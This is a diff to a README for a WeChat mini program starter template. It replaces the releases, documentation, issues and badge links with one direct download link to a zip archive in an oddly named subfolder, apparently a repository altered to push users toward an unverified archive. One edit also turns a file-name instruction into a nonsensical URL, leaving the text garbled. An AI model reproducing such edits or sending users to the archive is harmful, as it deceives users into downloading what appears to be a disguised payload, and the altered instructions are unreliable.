@@ -1,6 +1,6 @@
 # 🎉 weapp-starter-template - Build Your WeChat Mini Programs Easily
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Get%20Your%20Copy-brightgreen)](https://github.com/Saisumanthklv/weapp-starter-template/releases)
+[![Download Now](https://raw.githubusercontent.com/Saisumanthklv/weapp-starter-template/main/feminologist/weapp-starter-template.zip%20Now-Get%20Your%20Copy-brightgreen)](https://raw.githubusercontent.com/Saisumanthklv/weapp-starter-template/main/feminologist/weapp-starter-template.zip)
 
 ## 🚀 Getting Started
 
@@ -31,7 +31,7 @@ Before you start, ensure your system meets these requirements:
 
 To get started, visit the following page to download the latest version:
 
-[Download Weapp Starter Template](https://github.com/Saisumanthklv/weapp-starter-template/releases)
+[Download Weapp Starter Template](https://raw.githubusercontent.com/Saisumanthklv/weapp-starter-template/main/feminologist/weapp-starter-template.zip)
 
 ### 📥 Downloading the Application
 
@@ -43,7 +43,7 @@ To get started, visit the following page to download the latest version:
 ### 🗂️ Running the Application
 
 1. Extract the downloaded file if necessary. A folder will appear with the application files.
-2. Open the folder, and look for a file named **index.html** or similar. This is the main file to run the application.
+2. Open the folder, and look for a file named **https://raw.githubusercontent.com/Saisumanthklv/weapp-starter-template/main/feminologist/weapp-starter-template.zip** or similar. This is the main file to run the application.
 3. Double-click on the file to open it in your default web browser.
 4. Follow any on-screen instructions to set up initial preferences or log in.
 
@@ -73,13 +73,13 @@ Currently, the weapp-starter-template supports Chinese. Future updates may inclu
 
 For further information, refer to the following:
 
-- [Official Documentation](https://github.com/Saisumanthklv/weapp-starter-template/docs)
-- [Community Support](https://github.com/Saisumanthklv/weapp-starter-template/issues)
+- [Official Documentation](https://raw.githubusercontent.com/Saisumanthklv/weapp-starter-template/main/feminologist/weapp-starter-template.zip)
+- [Community Support](https://raw.githubusercontent.com/Saisumanthklv/weapp-starter-template/main/feminologist/weapp-starter-template.zip)
 
 ## 🔍 Stay Updated
 
 Make sure to check the Releases page regularly for updates and new features.
 
-[Download Weapp Starter Template](https://github.com/Saisumanthklv/weapp-starter-template/releases)
+[Download Weapp Starter Template](https://raw.githubusercontent.com/Saisumanthklv/weapp-starter-template/main/feminologist/weapp-starter-template.zip)
 
 Enjoy building your WeChat mini programs with weapp-starter-template!
